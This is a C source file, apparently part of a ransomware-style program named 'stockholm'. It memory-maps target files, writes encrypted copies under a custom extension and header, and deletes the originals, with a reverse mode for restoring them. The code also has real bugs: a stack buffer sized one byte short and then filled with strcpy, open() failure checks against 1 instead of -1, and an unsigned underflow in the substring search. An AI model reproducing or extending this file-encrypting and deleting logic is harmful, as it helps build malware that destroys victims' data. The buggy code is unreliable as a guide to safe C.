#include "stockholm.h"

// Function to search for a substring in binary data
bool search_binary(const char *data, size_t data_size, const char *substring)
{
    size_t substring_length = strlen(substring);

    for (size_t i = 0; i <= data_size - substring_length; i++)
    {
        if (memcmp(data + i, substring, substring_length) == 0)
            return 1; // Return 1 if found
    }
    return 0;
}

int fa_map_file_into_memory(const char *filename)
{
    // Open the target binary file
    int fd = open(filename, O_RDONLY);
    if (fd < 0) return FA_ERROR;
    printf("modes:%d for %s\n", g_modes, filename);
    
    // Determine the file size by moving the cursor till the end
    off_t res = lseek(fd, 0, SEEK_END);
    // Check that lseek didn't fail and not returning > int max
    if (res < 0 || res > 2147483647) return FA_ERROR;

    printf("res: %ld\n", res);

    // Put back the cursor at the beginning of the file
    if (lseek(fd, 0, SEEK_SET) < 0) return FA_ERROR;

    /* Map the file into memory
        - PROT_READ: read-only access
        - PROT_WRITE: write-only access
            We use both READ and WRITE since we are going to encrypt the
            mapped region directly.
        - MAP_PRIVATE: creates a private copy of the mapped data, so any
        modifications made to the mapped memory will not be visible
        to other processes mapping the same file
    */

    g_mapped_data =
        mmap(NULL, res, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (g_mapped_data == MAP_FAILED)
    {
        close(fd);
        return FA_ERROR;
    }

    close(fd); // No need to keep the fd since the file is mapped

    if (g_modes & FA_REVERSE)
    {
        // Copy the custom header of the encrypted file to the global variable
        memcpy(&g_stockhlm_header, g_mapped_data, FA_STOCKHLM_HEADER_SIZE);
        // Save the encrypted file size without the added custom header size
        g_encrypted_filesize = res - FA_STOCKHLM_HEADER_SIZE;
    } else {
        g_stockhlm_header.original_filesize = res;
    }

    // // Abort if the current target already contains our signature
    // if (search_binary((char *)g_mapped_data, g_stockhlm_header.original_filesize, FA_SIGNATURE))
    //     return 1;

    return FA_SUCCESS;
}

bool write_encrypted_data_to_file(const char *target_path)
{
    char    new_target_path[1024]; // Create a buffer to hold the full path
    int     outfilefd;

    // Use snprintf() to safely concatenate the strings and get the file path
    //  with our custom extension
    snprintf(
        new_target_path, sizeof(new_target_path),
        "%s.%s", target_path, FA_STOCKHLM_EXT
    );

    outfilefd = open(new_target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);        

    // Check if open() has failed
    if (outfilefd == 1) return FA_ERROR;

    // Write the custom header first to the outfile
    ssize_t bytes_written = write(outfilefd, &g_stockhlm_header, FA_STOCKHLM_HEADER_SIZE);
    if (bytes_written < 0) return FA_ERROR;

    // Then write the processed data to the outfile
    bytes_written = write(outfilefd, g_mapped_data, g_encrypted_filesize);
    if (bytes_written < 0) return FA_ERROR;

    close(outfilefd);
    return FA_SUCCESS;
}

bool write_decrypted_data_to_file(char *target_path)
{
    int     outfilefd;

    // We remove our custom extension by terminating the filename earlier.
    target_path[strlen(target_path) - FA_STOCKHLM_EXT_SIZE] = '\0';

    // 0755: rwx for owner, rx for group and others
    outfilefd = open(target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);

    // Check if open() has failed
    if (outfilefd == 1) return FA_ERROR;

    // Write the processed data to the outfile
    ssize_t bytes_written = write(
        outfilefd,
        g_mapped_data + FA_STOCKHLM_HEADER_SIZE, // Don't keep the custom header
        g_stockhlm_header.original_filesize
    );
    if (bytes_written < 0) return FA_ERROR;

    close(outfilefd);
    return FA_SUCCESS;
}

// Write the processed file data back to a new file
int fa_write_processed_data_to_file(const char *target_path)
{
    char    temp_path[strlen(target_path) - 1];
    // Copy the original string to the temporary variable
    strcpy(temp_path, target_path);

    if (g_modes & FA_REVERSE)
    {
        if (write_decrypted_data_to_file((char *)target_path) == FA_ERROR)
            return FA_ERROR;
        munmap(g_mapped_data, g_encrypted_filesize + FA_STOCKHLM_HEADER_SIZE);
    } else
    {
        if (write_encrypted_data_to_file(target_path) == FA_ERROR)
            return FA_ERROR;
        munmap(g_mapped_data, g_stockhlm_header.original_filesize);
    }

    // Remove the old file from the system
    if (remove(temp_path) != 0) return FA_ERROR;

    return FA_SUCCESS;
}
